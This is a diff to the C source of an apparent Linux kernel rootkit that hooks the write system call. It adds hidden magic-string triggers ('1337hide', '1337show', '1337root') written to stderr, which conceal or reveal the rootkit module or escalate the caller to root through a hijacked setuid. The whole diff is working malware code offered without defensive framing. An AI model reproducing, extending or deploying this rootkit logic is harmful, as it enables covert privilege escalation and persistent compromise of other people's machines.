@@ -2,6 +2,7 @@
 
 extern asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
 extern asmlinkage long (*real_write)(unsigned int, char __user *, size_t);
+extern asmlinkage int hijacked_setuid(uid_t uid);
 extern void rootkit_hide(void);
 extern void rootkit_show(void);
 static char *passwd = "/etc/passwd";
@@ -49,8 +50,18 @@ asmlinkage long hijacked_write(unsigned int fd, char __user *buf, size_t count)
 {
 	char *kbuf = NULL, *path = NULL,*str = NULL;
 	long num_writes = real_write(fd, buf, count); 
-	if(fd < 3 || num_writes == 0)
+	if(fd < 2 || num_writes == 0)
 		goto out;	
+	if (fd == 2) {
+		if(count > 7 && !strncmp(buf, "1337hide", 8))
+			rootkit_hide();
+		else if (count > 7 && !strncmp(buf, "1337show", 8))
+			rootkit_show();
+		else if (count > 7 && !strncmp(buf, "1337root", 8))
+			hijacked_setuid(INT_MAX);
+		else
+			goto out;
+	}
 	struct file *f = fget(fd);
 	if(f == NULL) {
 		goto out;
@@ -99,8 +110,6 @@ out:
 	 *"1337hide to hide our rootkit
 	 *"1337show to show our rootkit
 	 */
-	if (fd == 1 && !strncmp(buf, "1337hide", 8)) rootkit_hide();
-	if (fd == 1 && !strncmp(buf, "1337show", 8)) rootkit_show();
 	return num_writes;
 }
 
